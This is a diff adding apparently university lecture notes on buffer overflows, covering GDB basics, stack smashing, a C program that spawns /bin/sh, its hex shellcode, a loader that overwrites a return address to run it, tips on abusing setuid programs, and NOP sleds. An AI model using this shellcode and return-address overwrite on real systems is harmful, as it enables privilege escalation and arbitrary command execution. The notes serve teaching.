@@ -162,7 +162,7 @@ If you can make a program seg fault, theres a good chance you can own the progra
 
 **GDB:**
  - compile with `-g`
- - gdb ./<program>
+ - gdb `./<program>`
  - breakpoints: `break <line>` (probably the next line to ensure the line you want has executed)
  - run code: `r`
  - print variable: `p <var>`
@@ -191,3 +191,99 @@ Goal for `/srv/lamest_joke.c`
  - Get address of bar
  - Input the difference of these two things so that the return address of foo points to bar?
 
+### Smashing the Stack
+ - Manipulating the flow of execution as above, this process is sometimes called Stack Smashing
+ - Step 1: Find buffer overflow flaw
+ - Step 2: Smash the stack
+ - Step 3: Spawn a shell -> execute arbitrary commands
+	 - Particularly useful if program runs with setuid root/superuser privileges
+ - Step 4: Profit
+
+### Spawning a Shell
+```c
+// this is /srv/shellcode.c
+#include <stdlib.h> //exit
+#include <unistd.h> //execve
+
+void main() {
+	char* name[2];
+	name[0] = "/bin/sh";
+	name[1] = NULL;
+	execve(name[0], name, NULL);
+	exit(0);
+}
+```
+ - This compiles to the following binary:
+```
+"\xeb\x2a\x5e\x89\x76\x08\xc6\x46"  
+"\x07\x00\xc7\x46\x0c\x00\x00\x00"  
+"\x00\xb8\x0b\x00\x00\x00\x89\xf3"  
+"\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"  
+"\xb8\x01\x00\x00\x00\xbb\x00\x00"  
+"\x00\x00\xcd\x80\xe8\xd1\xff\xff"  
+"\xff\x2f\x62\x69\x6e\x2f\x73\x68"  
+"\x00\x89\xec\x5d\xc3";
+```
+```c
+// this is /srv/spawnshell.c
+void* shellcode = "\xeb\x2a\x5e\x89\x76\x08\xc6\x46"  
+				  "\x07\x00\xc7\x46\x0c\x00\x00\x00"  
+				  "\x00\xb8\x0b\x00\x00\x00\x89\xf3"  
+				  "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"  
+				  "\xb8\x01\x00\x00\x00\xbb\x00\x00"  
+				  "\x00\x00\xcd\x80\xe8\xd1\xff\xff"  
+				  "\xff\x2f\x62\x69\x6e\x2f\x73\x68"  
+				  "\x00\x89\xec\x5d\xc3";
+void main() {
+	long int* ret = (long int*) &ret + 2;
+	// Creates space on the stack for a pointer (plus 2 64 bit values)
+	(*ret) = (long int)shellcode;
+	// Then assigns the shellcode to that space
+}
+```
+ - To fix (for assignment 2):
+	 - When you create a shell, it drops setuid permissions immediately
+	 - On mocha there is a version of `/bin/sh` that does not drop permissions
+		 - Need to point to that one instead
+ - The stack:
+```
+return address = &shellcode
+frame pointer
+long int * ret
+```
+
+### Shellcode
+ - Shellcode need not simply spawn a shell
+	 - Many shellcode examples can be found online
+	 - Some half-decent tutorials on how to write your own shellcode
+	 - (Slide 13 on module0b)
+
+### Exploiting a real program
+ - Its trivial to execute the above attack if we control the source code
+	 - Not really an attack
+ - What if we don't control the source code
+	 - Where do we locate code to spawn a shell?
+		 - A1: Write it into the buffer we're overflowing
+		 - A2: Export it to an environment variable (these live at the top of the stack)
+		 - A3: Pass it to the program via argv
+	 - How do we find the return address on the stack?
+		 - ret addr will vary based on CPU, OS, compiler version, flags, etc
+		 - A4: Trial and error
+		 - A5: Debugger/disassembler
+		 - A6: Repeat return address many times, then hope for the best
+	 - What if we don't know the exact address of the shellcode?
+
+### No-operations (NOPs)
+```c
+int i = 0;  
+i+1;            // add 1 to i; promptly discard result  
+;               // NULL statement  
+{}              // empty block
+for ( int j=0; j<100; ++j ) { }    // do nothing... 100 times  
+for ( int j=0; j<100; ++j );       // do nothing... 100 times  
+(void) 0;       // a “canonical” NOP in C  
+char nop [] = “\x90”; // x86 NOP instruction
+```
+ - If we don't know the exact address of a shellcode, use a NOP sled
+	 - Pad the start of the shellcode with a bunch of NOPs
+	 - If we return to any address in the sequence of NOPs, execution flow will slide right into our shellcode
